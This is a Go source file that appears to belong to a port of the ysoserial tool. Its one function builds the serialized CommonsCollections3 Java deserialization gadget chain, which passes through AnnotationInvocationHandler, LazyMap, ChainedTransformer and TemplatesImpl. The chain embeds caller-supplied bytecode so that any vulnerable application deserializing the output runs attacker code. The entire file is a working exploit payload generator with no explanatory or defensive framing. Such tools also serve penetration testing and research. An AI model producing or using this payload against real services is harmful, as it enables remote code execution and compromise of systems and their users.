package ysoserial

func CommonsCollections3(bytecodes []byte) []byte {
	return ClassObject{
		name:             "sun.reflect.annotation.AnnotationInvocationHandler",
		serialVersionUID: 6182022883658399397,
		classDescFlags:   SC_SERIALIZABLE,
		fields: []Field{
			{"Ljava/util/Map;", "memberValues", ProxyClassObject{
				name: "java.lang.reflect.Proxy",
				interfaces: []string{
					"java.util.Map",
				},
				serialVersionUID: -2222568056686623797,
				classDescFlags:   SC_SERIALIZABLE,
				fields: []Field{
					{"Ljava/lang/reflect/InvocationHandler;", "h", ClassObject{
						name:             "sun.reflect.annotation.AnnotationInvocationHandler",
						serialVersionUID: 6182022883658399397,
						classDescFlags:   SC_SERIALIZABLE,
						fields: []Field{
							{"Ljava/util/Map;", "memberValues", ClassObject{
								name:             "org.apache.commons.collections.map.LazyMap",
								serialVersionUID: 7990956402564206740,
								classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
								fields: []Field{
									{"Lorg/apache/commons/collections/Transformer;", "factory", ClassObject{
										name:             "org.apache.commons.collections.functors.ChainedTransformer",
										serialVersionUID: 3514945074733160196,
										classDescFlags:   SC_SERIALIZABLE,
										fields: []Field{
											{"[Lorg/apache/commons/collections/Transformer;", "iTransformers", ArrayObject{
												name:             "[Lorg.apache.commons.collections.Transformer;",
												serialVersionUID: -4803604734341277543,
												classDescFlags:   SC_SERIALIZABLE,
												values: interfaces(
													ClassObject{
														name:             "org.apache.commons.collections.functors.ConstantTransformer",
														serialVersionUID: 6374440726369055124,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"Ljava/lang/Object;", "iConstant", ClassDesc{
																name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter",
																serialVersionUID: 0,
																classDescFlags:   0x00,
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													}, ClassObject{
														name:             "org.apache.commons.collections.functors.InstantiateTransformer",
														serialVersionUID: 3786388740793356347,
														classDescFlags:   SC_SERIALIZABLE,
														fields: []Field{
															{"[Ljava/lang/Object;", "iArgs", ArrayObject{
																name:             "[Ljava.lang.Object;",
																serialVersionUID: -8012369246846506644,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	ClassObject{
																		name:             "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
																		serialVersionUID: 673094361519270707,
																		classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
																		fields: []Field{
																			{Integer, "_indentNumber", 0},
																			{Integer, "_transletIndex", -1},
																			{Boolean, "_useServicesMechanism", false},
																			{"Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;", "_auxClasses", nil},
																			{"[[B", "_bytecodes", ArrayObject{
																				name:             "[[B",
																				serialVersionUID: 5475560301672258359,
																				classDescFlags:   SC_SERIALIZABLE,
																				values: interfaces(
																					ArrayObject{
																						name:             "[B",
																						serialVersionUID: -5984413125824719648,
																						classDescFlags:   SC_SERIALIZABLE,
																						values:           bytesToInterfaces(bytecodes),
																						annotations:      interfaces(),
																					}, ArrayObject{
																						name:             "[B",
																						serialVersionUID: -5984413125824719648,
																						classDescFlags:   SC_SERIALIZABLE,
																						values: interfaces(
																							byte(0xca), byte(0xfe), byte(0xba), byte(0xbe), byte(0x00), byte(0x00), byte(0x00), byte(0x32), byte(0x00), byte(0x1b), byte(0x0a), byte(0x00), byte(0x03), byte(0x00), byte(0x15), byte(0x07), byte(0x00), byte(0x17), byte(0x07), byte(0x00), byte(0x18), byte(0x07), byte(0x00), byte(0x19), byte(0x01), byte(0x00), byte(0x10), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x56), byte(0x65), byte(0x72), byte(0x73), byte(0x69), byte(0x6f), byte(0x6e), byte(0x55), byte(0x49), byte(0x44), byte(0x01), byte(0x00), byte(0x01), byte(0x4a), byte(0x01), byte(0x00), byte(0x0d), byte(0x43), byte(0x6f), byte(0x6e), byte(0x73), byte(0x74), byte(0x61), byte(0x6e), byte(0x74), byte(0x56), byte(0x61), byte(0x6c), byte(0x75), byte(0x65), byte(0x05), byte(0x71), byte(0xe6), byte(0x69), byte(0xee), byte(0x3c), byte(0x6d), byte(0x47), byte(0x18), byte(0x01), byte(0x00), byte(0x06), byte(0x3c), byte(0x69), byte(0x6e), byte(0x69), byte(0x74), byte(0x3e), byte(0x01), byte(0x00), byte(0x03), byte(0x28), byte(0x29), byte(0x56), byte(0x01), byte(0x00), byte(0x04), byte(0x43), byte(0x6f), byte(0x64), byte(0x65), byte(0x01), byte(0x00), byte(0x0f), byte(0x4c), byte(0x69), byte(0x6e), byte(0x65), byte(0x4e), byte(0x75), byte(0x6d), byte(0x62), byte(0x65), byte(0x72), byte(0x54), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x12), byte(0x4c), byte(0x6f), byte(0x63), byte(0x61), byte(0x6c), byte(0x56), byte(0x61), byte(0x72), byte(0x69), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x54), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x04), byte(0x74), byte(0x68), byte(0x69), byte(0x73), byte(0x01), byte(0x00), byte(0x03), byte(0x46), byte(0x6f), byte(0x6f), byte(0x01), byte(0x00), byte(0x0c), byte(0x49), byte(0x6e), byte(0x6e), byte(0x65), byte(0x72), byte(0x43), byte(0x6c), byte(0x61), byte(0x73), byte(0x73), byte(0x65), byte(0x73), byte(0x01), byte(0x00), byte(0x25), byte(0x4c), byte(0x79), byte(0x73), byte(0x6f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x2f), byte(0x70), byte(0x61), byte(0x79), byte(0x6c), byte(0x6f), byte(0x61), byte(0x64), byte(0x73), byte(0x2f), byte(0x75), byte(0x74), byte(0x69), byte(0x6c), byte(0x2f), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x24), byte(0x46), byte(0x6f), byte(0x6f), byte(0x3b), byte(0x01), byte(0x00), byte(0x0a), byte(0x53), byte(0x6f), byte(0x75), byte(0x72), byte(0x63), byte(0x65), byte(0x46), byte(0x69), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x0c), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x2e), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x0c), byte(0x00), byte(0x0a), byte(0x00), byte(0x0b), byte(0x07), byte(0x00), byte(0x1a), byte(0x01), byte(0x00), byte(0x23), byte(0x79), byte(0x73), byte(0x6f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x2f), byte(0x70), byte(0x61), byte(0x79), byte(0x6c), byte(0x6f), byte(0x61), byte(0x64), byte(0x73), byte(0x2f), byte(0x75), byte(0x74), byte(0x69), byte(0x6c), byte(0x2f), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x24), byte(0x46), byte(0x6f), byte(0x6f), byte(0x01), byte(0x00), byte(0x10), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x6c), byte(0x61), byte(0x6e), byte(0x67), byte(0x2f), byte(0x4f), byte(0x62), byte(0x6a), byte(0x65), byte(0x63), byte(0x74), byte(0x01), byte(0x00), byte(0x14), byte(0x6a), byte(0x61), byte(0x76), byte(0x61), byte(0x2f), byte(0x69), byte(0x6f), byte(0x2f), byte(0x53), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x69), byte(0x7a), byte(0x61), byte(0x62), byte(0x6c), byte(0x65), byte(0x01), byte(0x00), byte(0x1f), byte(0x79), byte(0x73), byte(0x6f), byte(0x73), byte(0x65), byte(0x72), byte(0x69), byte(0x61), byte(0x6c), byte(0x2f), byte(0x70), byte(0x61), byte(0x79), byte(0x6c), byte(0x6f), byte(0x61), byte(0x64), byte(0x73), byte(0x2f), byte(0x75), byte(0x74), byte(0x69), byte(0x6c), byte(0x2f), byte(0x47), byte(0x61), byte(0x64), byte(0x67), byte(0x65), byte(0x74), byte(0x73), byte(0x00), byte(0x21), byte(0x00), byte(0x02), byte(0x00), byte(0x03), byte(0x00), byte(0x01), byte(0x00), byte(0x04), byte(0x00), byte(0x01), byte(0x00), byte(0x1a), byte(0x00), byte(0x05), byte(0x00), byte(0x06), byte(0x00), byte(0x01), byte(0x00), byte(0x07), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x08), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x0a), byte(0x00), byte(0x0b), byte(0x00), byte(0x01), byte(0x00), byte(0x0c), byte(0x00), byte(0x00), byte(0x00), byte(0x2f), byte(0x00), byte(0x01), byte(0x00), byte(0x01), byte(0x00), byte(0x00), byte(0x00), byte(0x05), byte(0x2a), byte(0xb7), byte(0x00), byte(0x01), byte(0xb1), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x0d), byte(0x00), byte(0x00), byte(0x00), byte(0x06), byte(0x00), byte(0x01), byte(0x00), byte(0x00), byte(0x00), byte(0x2e), byte(0x00), byte(0x0e), byte(0x00), byte(0x00), byte(0x00), byte(0x0c), byte(0x00), byte(0x01), byte(0x00), byte(0x00), byte(0x00), byte(0x05), byte(0x00), byte(0x0f), byte(0x00), byte(0x12), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x13), byte(0x00), byte(0x00), byte(0x00), byte(0x02), byte(0x00), byte(0x14), byte(0x00), byte(0x11), byte(0x00), byte(0x00), byte(0x00), byte(0x0a), byte(0x00), byte(0x01), byte(0x00), byte(0x02), byte(0x00), byte(0x16), byte(0x00), byte(0x10), byte(0x00), byte(0x09),
																						),
																						annotations: interfaces(),
																					},
																				),
																				annotations: interfaces(),
																			},
																			},
																			{"[Ljava/lang/Class;", "_class", nil},
																			{"Ljava/lang/String;", "_name", "Pwnr"},
																			{"Ljava/util/Properties;", "_outputProperties", nil},
																		},
																		classAnnotations: interfaces(),
																		super:            nil,
																		objectAnnotations: interfaces(
																			blockData{0x00},
																		),
																	},
																),
																annotations: interfaces(),
															},
															},
															{"[Ljava/lang/Class;", "iParamTypes", ArrayObject{
																name:             "[Ljava.lang.Class;",
																serialVersionUID: -6118465897992725863,
																classDescFlags:   SC_SERIALIZABLE,
																values: interfaces(
																	ClassDesc{
																		name:             "javax.xml.transform.Templates",
																		serialVersionUID: 0,
																		classDescFlags:   0x00,
																	},
																),
																annotations: interfaces(),
															},
															},
														},
														classAnnotations:  interfaces(),
														super:             nil,
														objectAnnotations: interfaces(),
													},
												),
												annotations: interfaces(),
											},
											},
										},
										classAnnotations:  interfaces(),
										super:             nil,
										objectAnnotations: interfaces(),
									},
									},
								},
								classAnnotations: interfaces(),
								super:            nil,
								objectAnnotations: interfaces(
									ClassObject{
										name:             "java.util.HashMap",
										serialVersionUID: 362498820763181265,
										classDescFlags:   SC_WRITE_METHOD | SC_SERIALIZABLE,
										fields: []Field{
											{Float, "loadFactor", 0.75},
											{Integer, "threshold", 12},
										},
										classAnnotations: interfaces(),
										super:            nil,
										objectAnnotations: interfaces(
											blockData{0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00},
										),
									},
								),
							},
							},
							{"Ljava/lang/Class;", "type", ClassDesc{
								name:             "java.lang.Override",
								serialVersionUID: 0,
								classDescFlags:   0x00,
							},
							},
						},
						classAnnotations:  interfaces(),
						super:             nil,
						objectAnnotations: interfaces(),
					},
					},
				},
			},
			},
			{"Ljava/lang/Class;", "type", ClassDesc{
				name:             "java.lang.Override",
				serialVersionUID: 0,
				classDescFlags:   0x00,
			},
			},
		},
		classAnnotations:  interfaces(),
		super:             nil,
		objectAnnotations: interfaces(),
	}.SerializeWithMagicHeader()
}
